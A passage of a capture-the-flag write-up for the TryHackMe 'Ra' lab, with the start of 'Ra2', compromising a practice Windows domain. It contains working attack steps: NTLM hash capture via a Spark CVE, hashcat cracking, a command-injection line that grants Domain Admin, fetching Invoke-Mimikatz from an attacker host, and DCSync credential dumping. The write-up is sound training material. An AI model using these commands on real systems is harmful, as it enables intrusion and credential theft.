		|   Check 3 (port 32061/udp): CLEAN (Timeout)
		|   Check 4 (port 44578/udp): CLEAN (Timeout)
		|_  0/4 checks are positive: Host is CLEAN or ports are blocked
		
		Read data files from: /usr/bin/../share/nmap
		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		# Nmap done at Wed Aug  7 19:34:55 2024 -- 1 IP address (1 host up) scanned in 169.47 seconds
  </pre>
</details>

### Company Portal

In the http://windcorp.thm:80/ page, which serves as a default company portal, there are two notable findings:

1. **Employee/IT Staff Usernames**: The page lists several usernames associated with company employees and IT staff. This exposure of usernames assisted in targeting specific individuals within the organization.

2. **Reset Password Button**: The page features a "Reset Password" button. Clicking this button redirects users to a different web page, http://fire.windcorp.thm/reset.asp.

![Pasted image 20240807194639](https://github.com/user-attachments/assets/0e7a7bcd-c0bb-49fa-a4fa-e3e355f74e93)

### Admin Center
On accessing https://windcorp.thm:443, the page prompts for authentication. 

![Pasted image 20240807200101](https://github.com/user-attachments/assets/da325357-3404-47c8-8a41-00e7bbc99667)

Once valid credentials are provided, users are granted access to the Windows Admin portal.

![Pasted image 20240807203938](https://github.com/user-attachments/assets/51009164-9969-4617-9e33-c65389abe780)

per microsoft: 

_"Windows Admin Center is a lightweight, browser-based GUI platform and toolset for IT Admins to manage Windows Server and Windows 10. It's the evolution of familiar in-box administrative tools, such as Server Manager and Microsoft Management Console (MMC) into a modernized, simplified, integrated, and secure experience."_

Unauthorized access to Windows Admin Center can lead to critical risks, compromising both security and operational stability.

### Openfire Admin Console

The URL http://windcorp.thm:9090 leads to the Openfire Admin Console login page. Openfire is an XMPP server that facilitates real-time messaging and collaboration. The Admin Console is a web-based interface used to manage and configure the Openfire server, including user accounts, server settings, and various other administrative functions.

![Pasted image 20240807200536](https://github.com/user-attachments/assets/aeb0fbaa-9e4f-4a25-b558-521df3dfe0a7)

### Windcorp Fire Web Page

The page at http://fire.windcorp.thm/reset.asp, which is reached via a redirection from the reset password button, features a form designed for password recovery. Users are prompted to enter their username and answer security questions in order to reset their password.

The security questions used are weak and could potentially be guessed or discovered through Open Source Intelligence.

![Pasted image 20240807201932](https://github.com/user-attachments/assets/4ea2a73a-08bb-4aa4-a8a4-3e600fd532c2)

One of the questions asks for the user's favorite pet name. An employee named Lily Levesque has a dog named Sparky, as evidenced by her picture on the company portal.

Using this information, I successfully answered the security question, which allowed us to reset the password to `ChangeMe#1234`.

This vulnerability allows unauthorized users to not only reset passwords but also see the new password immediately, facilitating unauthorized access to user accounts.

![Pasted image 20240807202251](https://github.com/user-attachments/assets/0fb846ab-6a69-4c39-9b54-0f601ca3e7ff)

### SMB Shares Ra

With the newly obtained credentials, I was able to access and enumerate SMB shares on port 445. This could potentially reveal sensitive files or directories that are accessible due to misconfigured permissions or other security weaknesses.

![Pasted image 20240807203039](https://github.com/user-attachments/assets/a5c11b78-6c73-4ce1-8e71-7e7e0e0833bc)

#### //windcorp.thm/Shared

In the "Shared" SMB share, there were some files related to the Spark software used by the company.

```
  .                                   D        0  Fri May 29 21:45:42 2020
  ..                                  D        0  Fri May 29 21:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 12:32:36 2020
  spark_2_8_3.deb                     A 29526628  Fri May 29 21:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 08:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 08:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 08:07:24 2020
  
  15587583 blocks of size 4096. 10909373 blocks available
```

These files indicate that the company uses Spark software across different platforms.

#### smb://windcorp.thm/Users

The "Users" share had a collection of individual home directories. Each directory appeared to be private, containing personal files for employees, but access was restricted to only one's own directory.

```
  .                                  DR        0  Sat May  2 19:05:58 2020
  ..                                 DR        0  Sat May  2 19:05:58 2020
  Administrator                       D        0  Sun May 10 08:18:11 2020
  All Users                       DHSrn        0  Sat Sep 15 04:28:48 2018
  angrybird                           D        0  Fri May  1 09:59:20 2020
  berg                                D        0  Fri May  1 09:59:20 2020
  bluefrog579                         D        0  Fri May  1 09:59:20 2020
  brittanycr                          D        0  Sat May  2 20:36:46 2020
  brownostrich284                     D        0  Fri May  1 09:59:20 2020
  buse                                D        0  Wed Aug  7 19:27:03 2024
  Default                           DHR        0  Thu Apr 30 20:35:11 2020
  Default User                    DHSrn        0  Sat Sep 15 04:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 04:16:48 2018
  edward                              D        0  Fri May  1 09:59:20 2020
  freddy                              D        0  Sat May  2 20:30:16 2020
  garys                               D        0  Fri May  1 09:59:20 2020
  goldencat416                        D        0  Wed Aug  7 20:36:05 2024
  goldenwol                           D        0  Fri May  1 09:59:20 2020
  happ                                D        0  Fri May  1 09:59:20 2020
  happyme                             D        0  Fri May  1 09:59:20 2020
  Luis                                D        0  Fri May  1 09:59:20 2020
  orga                                D        0  Fri May  1 09:59:20 2020
  organicf                            D        0  Fri May  1 09:59:20 2020
  organicfish718                      D        0  Wed Aug  7 20:36:59 2024
  pete                                D        0  Fri May  1 09:59:20 2020
  Public                             DR        0  Thu Apr 30 11:35:47 2020
  purplecat                           D        0  Fri May  1 09:59:20 2020
  purplepanda                         D        0  Fri May  1 09:59:20 2020
  sadswan                             D        0  Fri May  1 09:59:20 2020
  sadswan869                          D        0  Wed Aug  7 20:35:23 2024
  sheela                              D        0  Fri May  1 09:59:20 2020
  silver                              D        0  Fri May  1 09:59:20 2020
  smallf                              D        0  Fri May  1 09:59:20 2020
  spiff                               D        0  Fri May  1 09:59:20 2020
  tinygoos                            D        0  Fri May  1 09:59:20 2020
  whiteleopard                        D        0  Fri May  1 09:59:20 2020

15587583 blocks of size 4096. 10909236 blocks available
```

### Spark Application

![Pasted image 20240807210750](https://github.com/user-attachments/assets/9e4218df-9c75-4a4d-a46a-941c6d93b0b4)

After downloading and installing the software, I logged in using the credentials obtained from the earlier password reset process, which were associated with the user account lilyle@windcorp.thm. This allowed access to the Spark client and the company’s internal messaging system.

### CVE-2020-12772
The Spark version in use was 2.8.3, which is vulnerable to CVE-2020-12772

References:

> https://nvd.nist.gov/vuln/detail/CVE-2020-12772

A chat message can include an IMG element with a SRC attribute referencing an external host's IP address. Upon access to this external host, the NTLM hashes of the user are sent with the HTTP request.

The company portal indicated that _buse candan_ (buse@fire.windcorp.thm) was online at the time. Therefore, I ran [Responder](https://github.com/lgandx/Responder), delivered the payload to him, and attempted to capture the NTLMv2 authentication.

![Pasted image 20240807213035](https://github.com/user-attachments/assets/b7514a29-c03d-4166-9b19-2a23ea65a593)

![Pasted image 20240807212929](https://github.com/user-attachments/assets/4bb3dc51-273a-4154-8b36-1b2d0d42a6fc)

### Initial Access Ra

After capturing Buse Candan's authentication hash, I proceeded to crack it using Hashcat in mode 5600 with the Rockyou wordlist. I eventually discovered that the password was `uzunLM+3131`.

```bash
./hashcat.bin -m 5600 -a 0 hashes/buse-windcorp.hash  wordlists/rockyou.txt

B010100000000000037e5f79929e9da01cdc4e33c85a0eb350000000002000800420036004b00330001001e00570049004e002d003000580033004800480039003200430051004b00420004001400420036004b0033002e004c004f00430041004c0003003400570049004e002d003000580033004800480039003200430051004b0042002e00420036004b0033002e004c004f00430041004c0005001400420036004b0033002e004c004f00430041004c000800300030000000000000000100000000200000b20fa28fdc7ffbc73edf7e214be2392a756e11aca27082b84544e01d496018270a00100000000000000000000000000000000000090000000000000000000000USE::WINDCORP:27a1b98a12468d7e:3dfbfd95cfb482771afc638be85bb04f::uzunLM+3131
```

I confirmed that it was possible to establish a remote PowerShell session, then logged in as Buse.

![Pasted image 20240807214050](https://github.com/user-attachments/assets/b0ace065-668f-4bc7-89e1-dc7129ad3319)

![Pasted image 20240807214327](https://github.com/user-attachments/assets/4d68a639-e4b2-40d4-9a33-ddcf8c3b3c8f)


### Post-Exploitation

![Pasted image 20240807215505](https://github.com/user-attachments/assets/11c91317-a80e-493f-93a8-17883028f4f6)

The `BULTIN\Account Operators` group by default has privileges to login to DCs and manage all non-protected users & groups.

"Protected" means those whose Attribute `AdminCount = 1`. These users and groups get their DACL from the AdminSDHolder and do not inherit their DACL from any OUs that they are placed in by a careless administrator.

The `C:\scripts` contained two files, both of which were owned by the `BUILTIN\Administrators` group

```
Directory: C:\scripts


Path             Owner                  Access
----             -----                  ------
checkservers.ps1 BUILTIN\Administrators NT AUTHORITY\SYSTEM Allow  FullControl...
log.txt          BUILTIN\Administrators NT AUTHORITY\SYSTEM Allow  FullControl...
```

#### checkservers.ps1

```powershell
# reset the lists of hosts prior to looping 
$OutageHosts = $Null 
# specify the time you want email notifications resent for hosts that are down 
$EmailTimeOut = 30 
# specify the time you want to cycle through your host lists. 
$SleepTimeOut = 45 
# specify the maximum hosts that can be down before the script is aborted 
$MaxOutageCount = 10 
# specify who gets notified 
$notificationto = "brittanycr@windcorp.thm" 
# specify where the notifications come from 
$notificationfrom = "admin@windcorp.thm" 
# specify the SMTP server 
$smtpserver = "relay.windcorp.thm" 
 
# start looping here 
Do{ 
$available = $Null 
$notavailable = $Null 
Write-Host (Get-Date) 
 
# Read the File with the Hosts every cycle, this way to can add/remove hosts 
# from the list without touching the script/scheduled task,  
# also hash/comment (#) out any hosts that are going for maintenance or are down. 
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |   
ForEach-Object { 
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p 
if($p) 
    { 
     # if the Host is available then just write it to the screen 
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White 
     [Array]$available += $_ 
    } 
else 
    { 
     # If the host is unavailable, give a warning to screen 
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White 
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue 
     if(!($p)) 
       { 
        # If the host is still unavailable for 4 full pings, write error and send email 
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White 
        [Array]$notavailable += $_ 
 
        if ($OutageHosts -ne $Null) 
            { 
                if (!$OutageHosts.ContainsKey($_)) 
                { 
                 # First time down add to the list and send email 
                 Write-Host "$_ Is not in the OutageHosts list, first time down" 
                 $OutageHosts.Add($_,(get-date)) 
                 $Now = Get-date 
                 $Body = "$_ has not responded for 5 pings at $Now" 
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
                  -Subject "Host $_ is down" -SmtpServer $smtpserver 
                } 
                else 
                { 
                    # If the host is in the list do nothing for 1 hour and then remove from the list. 
                    Write-Host "$_ Is in the OutageHosts list" 
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut) 
                    {$OutageHosts.Remove($_)} 
                } 
            } 
        else 
            { 
                # First time down create the list and send email 
                Write-Host "Adding $_ to OutageHosts." 
                $OutageHosts = @{$_=(get-date)} 
                $Body = "$_ has not responded for 5 pings at $Now"  
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
                 -Subject "Host $_ is down" -SmtpServer $smtpserver 
            }  
       } 
    } 
} 
# Report to screen the details 
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count 
Write-Host "Not available count:"$notavailable.count 
Write-Host "Not available hosts:" 
$OutageHosts 
Write-Host "" 
Write-Host "Sleeping $SleepTimeOut seconds" 
sleep $SleepTimeOut 
if ($OutageHosts.Count -gt $MaxOutageCount) 
{ 
    # If there are more than a certain number of host down in an hour abort the script. 
    $Exit = $True 
    $body = $OutageHosts | Out-String 
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer 
} 
} 
while ($Exit -ne $True) 
```

The PowerShell script reads values from `C:\Users\brittanycr\hosts.txt`, processes them, and then executes the results using `Invoke-Expression`.

### Privilege Escalation

To exploit the `checkserver.ps1` script, I used the Account Operators privileges to reset the password of the user who owned the text file `hosts.txt` (brittanycr@windcorp.thm).

```powershell
$ Set-ADAccountPassword -Identity brittanycr -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "PASSWORD_HERE" -Force)
```

Unfortunately, the user `brittanycr` lacked WinRM privileges, so I needed to create a `hosts.txt` and transfer it to her home directory. I leveraged the previously discovered SMB share to move the file into place.

![Pasted image 20240807224234](https://github.com/user-attachments/assets/0928748a-c8a9-498d-9ca4-d3ebcb1d4407)

#### hosts.txt

```powershell
; Add-ADGroupMember -Identity “Domain Admins” -Members “buse” ; Add-ADGroupMember -Identity “Administrators” -Members “buse”
```

After transferring the file to `brittanycr`'s home directory, I waited a few minutes for the scheduled task on the Domain Controller to execute the PowerShell script.

Once it runs, the command injection triggered the payload, effectively, granting me membership of both `WINDCORP\Domain Admins` and `BUILTIN\Administrators`.

![Pasted image 20240807224817](https://github.com/user-attachments/assets/0185ee67-c815-4c2b-b63f-a7f5b71ea4fa)

### Goal Execution Ra

For this part I used [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1), a PowerShell script used to execute Mimikatz commands on a Windows machine.

```powershell
Invoke-WebRequest -Uri 'http://$ip_addr:8000/Invoke-Mimikatz.ps1' -OutFile 'Invoke-Mimikatz.ps1'

. .\Invoke-Mimikatz.ps1

Invoke-Mimikatz -Command '"token::elevate" "privilege::debug" "lsadump::dcsync /user:windcorp\Administrator"' > mimikatz.dump

Invoke-Mimikatz -Command 'lsadump::backupkeys /system:localhost /export'
```

The command `Invoke-Mimikatz -Command '"token::elevate" "privilege::debug" "lsadump::dcsync /user:windcorp\Administrator"' > mimikatz.dump` executes the Mimikatz module within PowerShell to elevate privileges, enable debugging, and dump the credentials of the specified user Administrator@windcorp.thm.

The output, including sensitive information such as password hashes, is saved to a file named `mimikatz.dump`.

I also extracted the DPAPI keys using the command `lsadump::backupkeys /system:localhost /export`, this will be important later on.

With the obtained password hash `bfa4cae19504e0591ef0a523a1936cd4`, I used [nxc](https://github.com/Pennyw0rth/NetExec) again to verify if I could establish a PowerShell remote session as  `Administrator`.

![Pasted image 20240807231249](https://github.com/user-attachments/assets/1753a358-6f28-4bca-a34d-b0fabf13f38d)

Since I could not access the system via RDP without a password, I bypassed this limitation by editing the registry through my WinRM shell. This approach allowed me to modify settings directly from the command line to enable RDP access or make other necessary adjustments.

![Pasted image 20240807232154](https://github.com/user-attachments/assets/e754ca5f-9fba-456a-93e7-2c28c7fd576c)

```powershell
$ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Pasted image 20240809023247](https://github.com/user-attachments/assets/0bf1727e-2d0d-41b5-893c-c3d3a036a0ba)

---

## Ra2

> https://tryhackme.com/r/room/ra2

![d510be4de2e82a0fe052be89d43abcc1](https://github.com/user-attachments/assets/9a266541-66a7-4128-9d92-f6a082ac74b7)

WindCorp recently had a security-breach. Since then they have hardened their infrastructure, learning from their mistakes. But maybe not enough? You have managed to enter their local network...

### Reconnaissance Ra2

On August 9, 2024, a scan was performed on the target machine using Nmap and dig.

<details>
  <summary>NMAP Scan summary</summary>
  <pre>
# Nmap 7.94SVN scan initiated Fri Aug  9 03:10:13 2024 as: nmap -sV -sC -Pn -vv -T4 -oA nmap/regular-ra2 -p 53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5269,5270,7070,7443,7777,9090,9091,9389 10.10.15.199
Nmap scan report for 10.10.15.199
Host is up, received user-set (0.32s latency).
Scanned at 2024-08-09 03:10:13 -03 for 152s
<!--  -->
PORT     STATE SERVICE             REASON          VERSION
53/tcp   open  domain              syn-ack ttl 125 Simple DNS Plus
80/tcp   open  http                syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://fire.windcorp.thm/
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec        syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-08-09 06:10:22Z)
135/tcp  open  msrpc               syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn         syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap                syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-09T06:12:34+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b:dc39:5ce5:dd7b:19a5:851c:01d1:23ad
| SHA-1: 37f4:e667:cef7:5cc4:47c9:d201:25cf:2b7d:20b2:c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
443/tcp  open  ssl/http            syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b:dc39:5ce5:dd7b:19a5:851c:01d1:23ad
| SHA-1: 37f4:e667:cef7:5cc4:47c9:d201:25cf:2b7d:20b2:c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-08-09T06:12:31+00:00; 0s from scanner time.
|_http-title: Not Found
| http-methods: 
|_  Supported Methods: GET OPTIONS
445/tcp  open  microsoft-ds?       syn-ack ttl 125
464/tcp  open  kpasswd5?           syn-ack ttl 125
593/tcp  open  ncacn_http          syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap            syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b:dc39:5ce5:dd7b:19a5:851c:01d1:23ad
| SHA-1: 37f4:e667:cef7:5cc4:47c9:d201:25cf:2b7d:20b2:c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-08-09T06:12:33+00:00; +1s from scanner time.
2179/tcp open  vmrdp?              syn-ack ttl 125
3268/tcp open  ldap                syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-09T06:12:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b:dc39:5ce5:dd7b:19a5:851c:01d1:23ad
| SHA-1: 37f4:e667:cef7:5cc4:47c9:d201:25cf:2b7d:20b2:c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap            syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804b:dc39:5ce5:dd7b:19a5:851c:01d1:23ad
